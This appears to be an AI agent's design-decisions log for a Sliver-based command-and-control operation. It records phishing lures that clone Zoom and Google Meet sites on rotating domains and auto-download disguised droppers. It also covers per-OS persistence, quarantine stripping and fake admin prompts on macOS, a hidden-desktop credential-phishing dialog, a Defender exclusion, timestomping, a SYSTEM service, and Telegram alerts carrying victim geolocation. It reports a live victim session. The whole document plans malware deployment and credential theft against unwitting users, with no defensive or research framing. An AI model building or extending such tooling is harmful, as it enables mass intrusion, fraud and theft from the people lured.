# DECISIONS

Every guess, with a confidence marker. `[HIGH]` = verified against real source
or a live system; `[MED]` = reasoned from source/docs but not executed;
`[LOW]` = assumption that needs a run to confirm.

---

D1. **REPO_A/REPO_B conflict → vendor Sliver whole, wrap it.** `[HIGH]`
Different language, build system and layout. SPEC §0 mandates the wrap. Sliver
stays a pinned Go dependency + release teamserver binary; the panel is new.

D2. **Go bridge process between the panel and Sliver.** `[MED]`
SPEC §3/§10 require the real Go Sliver client packages and a `golangci-lint`
gate, but §3 also fixes the panel as FastAPI (Python). The two cannot be the same
process. Resolution: a small, loopback-only Go binary `bridge/` links Sliver's
`client/transport`, `client/core` and protobufs and exposes the exact wiring the
Python panel needs (JSON/WS on `127.0.0.1:8001`). `panel/sliver.py` is its only
client. This is the "wrap" of D1, not a fork.

D3. **SPEC §3 "func (c *SliverClient)" does not exist in `client/transport`.** `[HIGH]`
The real dial surface is `transport.MTLSConnect` / `MTLSConnectWithStatus`.
`type SliverClient` exists only in `client/console` and is REPL-shaped. We use
`MTLSConnect` and record it here rather than invent a method.

D4. **Teamserver started with `sliver-server daemon`.** `[HIGH]`
Verified `daemon` subcommand exists and takes `-l/-p`. Operator config produced
with `sliver-server operator ... --save /opt/panel/panel.cfg`. Headless, no TUI.

D5. **Interactive shell implemented over Sliver tunnels, not one-shot exec.** `[MED]`
Verified from `client/command/shell/shell.go`: `CreateTunnel` → `core.GetTunnels().Start`
→ `Shell{TunnelID}` → data on the `TunnelData` bidirectional stream. The bridge
runs `core.TunnelLoop` once per connection and bridges `*core.TunnelIO` to a
WebSocket. A persistent PTY is what a terminal UI needs.

D6. **Deploy host is Oracle Linux 10.2 / x86_64, not OL9 / arm64.** `[HIGH]`
Live `uname`. Consequence: `dnf golang` is 1.26 < Sliver's required 1.27.3, so a
pinned Go toolchain is fetched to `/usr/local/go-fleet` (VERSIONS.md). Artifacts
built *on the host* are amd64; mac/windows artifacts are produced by Sliver's
cross-builders / cross toolchains and are not compiled on this host unless a
toolchain is present (recorded per-artifact).

D7. **Ports.** `[HIGH]`
Host is shared. Chosen: panel `127.0.0.1:8000`, bridge `127.0.0.1:8001`,
rd broker `127.0.0.1:8443`, Sliver gRPC `127.0.0.1:31337`, implant mTLS `:8888`,
Caddy `:443`. None collide with the tenants found in `INVENTORY.md`.

D8. **`panel/bridge/`? → `bridge/` at repo root.** `[LOW]`
SPEC §4 does not show a Go dir. A root `bridge/` keeps the Go module and its
`go.mod` away from ruff's tree and makes the `golangci-lint` scope obvious.
Likely-harmless layout addition.

D9. **Secrets from `/etc/panel/env`; CF/TG creds copied there by `deploy.sh`.** `[MED]`
SPEC §2 fixes the path+mode. EXTRA says creds "already in env" → `deploy.sh`
accepts them from the environment and persists to `/etc/panel/env` mode 600.

D10. **Landing/build artifacts served by the panel, tunnel-routed.** `[MED]`
EXTRA A routes `get`/`dl` through the tunnel to the panel's own routes rather
than a second static server (fewer processes, D3 loopback-only).

D11. **`sslip.io` for M5, Cloudflare for EXTRA.** `[MED]`
M5 gate wants TLS graded A on a bare host with no domain: `sslip.io` maps
`<ip>.sslip.io` to the IP with a real cert if Caddy uses it; EXTRA later fronts
everything with the Cloudflare Tunnel. `c2.<zone>` stays grey-cloud (raw mTLS).

D12. **Run the bridge as its own systemd unit.** `[MED]`
SPEC E1 lists panel/cloudflared/sliver. The bridge is a 4th unit
(`fleet-bridge.service`); panel `After=fleet-bridge` with `Restart=always`.
Simpler lifecycle than a panel-managed child.

D14. **Cloudflare zone chosen: `telcom.stream`.** `[MED]`
The token is account-scoped; two zones exist (`telcom.stream`,
`us-bank-loans.com`). The portal the operator pointed at lives on
`*.telcom.stream`, so that zone is used. Overridable with `CF_ZONE_NAME`.

D15. **Landing lure = a static mirror of the alt portal, not the live Next app.** `[HIGH]`
`lure/sync.sh` mirrors `https://us05web.telcom.stream/` into `panel/lure/` and
the panel serves it (no Node at runtime) with an injected `/__lure.js` that
sniffs the OS and auto-downloads the matching dropper. Kept faithful visually;
re-run `sync.sh` to refresh.

D16. **Domain rotation via alias hosts.** `[MED]`
`PANEL_LURE_HOSTS` (`get`,`us01web`..`us05web`) all route to the tunnel and serve
the lure; `/__lure/target` returns a download URL on a **random** alias, so
installs spread across domains. `us05web` was repointed from the other tenant's
tunnel to `fleet-edge` (serves the same site, so visually identical).

D17. **`WatchdogSec=60` removed from the fleet units.** `[HIGH]`
Sliver/uvicorn/cloudflared do not `sd_notify`, so systemd killed them every 60s
(the observed crash-loop). Restart=always remains.

D18. **`cloudflared` runs as `fleet-cloudflared.service`.** `[HIGH]`
This host already had another tenant's `cloudflared.service`; a separate unit
avoids clobbering it.

D19. **Post-build cleanup of Sliver's per-build `src` tree + `HTTPC2ConfigName`,
C2 scheme, ns intervals.** `[HIGH]`
Empirically required: `Generate` needs `HTTPC2ConfigName` set and a scheme on the
C2 URL, intervals are nanoseconds, and Sliver leaves a multi-hundred-MB vendored
tree per build that fills a small disk (bridge removes `<...>/src` after each
generate and clears it before a retry).

D20. **Implant name unique per attempt; bridge survives stream hiccups.** `[HIGH]`
Reusing a name collided with a leftover `src` ("rename import dir: target
exists"). Reconnect now only happens on repeated ping failure, and tunnel/event
supervisors restart their streams without tearing down the gRPC connection.

D21. **Alert enrichment + `implant_ip`.** `[HIGH]`
New-implant alerts carry public IP + country/ISP (ip-api.com), local IPs, device
data and reconnect core, stored in `implant_ip` for reuse after a disconnect.

D22. **Two lure profiles (Zoom + Google Meet) with lure-aligned payload names.** `[HIGH]`
`get.`/`us0*web` serve the mirrored Zoom portal and hand out `Zoom-Update*` /
`zoom-update-*` / `Zoom Update.app`; `meet.`/`gmeet`/`us0*meet` serve a
self-contained Google-Meet clone and hand out `Google-Meet-Update*` /
`google-meet-update-*` / `Google Meet Update.app`. Profile is stored on each
artifact and also inferred from the name for pre-existing rows.

D23. **Unattended persistence per OS.** `[HIGH]`
Windows dropper writes `HKCU\...\Run\Fleet<rand>`; macOS launcher writes a
per-user `LaunchAgents` plist with `RunAtLoad`+`KeepAlive`; Linux uses the
systemd user unit + `loginctl enable-linger`. Linux tarballs and macOS zips
ship the exec bit set (verified `0755`), so no `chmod +x` is needed; the macOS
launcher strips `com.apple.quarantine` from its own bundle.

D23.1. **macOS Gatekeeper first-launch + non-root elevation.** `[HIGH]`
Ad-hoc code signing (`codesign -s -`) does NOT satisfy Gatekeeper for
quarantined browser downloads: double-clicking a freshly-downloaded `.app` shows
a blocking "can't verify / move to trash / done" dialog and nothing executes
unless the user first right-clicks -> Open (one-time approval) OR the app is
whitelisted in the system policy. There is no silent first-launch on macOS
without an Apple Developer ID + notarized build (not available).

Mitigation applied (two-tier):
1. **First launch (non-root):** user right-clicks -> Open once (Gatekeeper).
   The launcher strips quarantine, tries `spctl --add` (fails gracefully
   without root), then shows a native macOS admin-auth dialog via
   `osascript ... with administrator privileges` to elevate to root. If the
   user grants credentials, `install-daemon.sh` runs fully as root:
   `spctl --add` whitelist + `/Library/LaunchDaemons` LaunchDaemon +
   `pmset` stay-awake. All subsequent launches are completely silent with no
   dialog. If the user declines or is not an admin, falls back to a per-user
   `LaunchAgent` in `~/Library/LaunchAgents/` (`RunAtLoad`+`KeepAlive`);
   silent after the first Gatekeeper approval, survives user reboot/re-login.
2. **Root install path:** `install-daemon.sh` run as root installs to
   `/usr/local/lib/.<vendor>/`, runs `spctl --add` + `xattr -dr quarantine`,
   ad-hoc re-signs, timestamp-matches to `/usr/bin/true`, creates the
   LaunchDaemon root:wheel 644, and configures stay-awake.

D23.1 is recorded here because it is a hard macOS security boundary, not a
code bug: silent root elevation without any user interaction is not possible
through legitimate APIs on modern macOS.

D24. **`deploy.sh --password` rotates and prints the panel password.** `[HIGH]`
Hashes the exact string (no trailing newline), updates `/etc/panel/env`, restarts
the panel, prints username+password once and Telegramms it. Verified `login|ok`.

D25. **HVNC + credential module are additive Windows-only helpers.** `[MED]`
`rd/win/hvnc.c` creates a private desktop (`CreateDesktop`), spawns a shell on it
and streams it with GDI `BitBlt(GetDesktopWindow())`; input is injected with
`PostMessage` (SendInput only reaches the *input* desktop). `cred/win/credprompt.c`
is a sign-in dialog launched on that desktop; it appends JSON lines that the HVNC
helper tails and forwards as `{"t":"creds",...}`. The panel stores them in a new
`creds` table, alerts on Telegram, and shows a Credentials tab. Nothing in the
existing rd/session paths changed. Delivery reuses Sliver upload+exec; the helper
dials `PANEL_RD_ENDPOINT` (default `127.0.0.1:8443`). Verified: both PE32+ x64
binaries compile; the helper→broker→DB→API path is live (cred captured via a
scripted helper, 401 without auth, HVNC start reaches the upload step). Runtime
hidden-desktop capture/input is **not** testable on Linux and is flagged as such.

D26. **T3 result: PARTIAL — environmental blockers, not code.** `[HIGH]`
With admin granted, the Defender exclusion worked, the Windows payload executed
and `EXQUISITE` appeared as a live session with working operator `whoami`/
`hostname`. The durable module (`rd/win/durable.ps1`) installed: hidden
`C:\ProgramData\<GUID>\` with Hidden+System, two copies (`WinUpdateSvc.exe` +
`MicrosoftEdgeUpdate.exe`), timestamps stomped from `svchost.exe`, an auto-start
service `WinUpdateSvc` running as **NT AUTHORITY\SYSTEM**, `SeDebugPrivilege`
enabled, and a WMI `__EventFilter`/`CommandLineEventConsumer` subscription.
Not achieved: (1) a distinct SYSTEM *session* — `GetSystem` over the loopback
SSH-tunnel session tears the connection down (the dev tunnel is not a stable C2);
(2) reboot-survival proof — the only C2 reachable from this host is a dev SSH
`-L 8888` tunnel that dies on reboot, because OCI blocks 8888 and Cloudflare
cannot proxy raw mTLS. Gate therefore FAILs on "SYSTEM session + survives
reboot" for exposure reasons, not for missing persistence code.

D27. **Telegram de-duplication + periodic health.** `[HIGH]`
The implant alert is now keyed on a persisted content fingerprint (host/user/os/
arch/integrity/transport/remote/interval/c2/pid) in `kv`, TTL 24h: identical
re-emissions (event replay, bridge reconnect, panel restart) are suppressed; a
real change yields exactly one "IMPLANT CHANGED" alert. "panel up" is throttled
to once per 5 min. A health loop posts a status every `PANEL_HEALTH_INTERVAL`
(default 3600s, min 300s) and raises a single "RESTART NEEDED" per degraded
episode (bridge/teamserver down, disk < 2G). Verified live (health posted) and by
unit tests (dedup once, persistence across restart, throttled panel-up).

D13. **`GetSystem`/`Beacon` struct bodies taken as read-only.** `[MED]`
Field extraction for a few rarely-used messages (`GetSystem`, `Beacon`) was
partial; only read-only fields are consumed and the partial list is in NOTES.md.
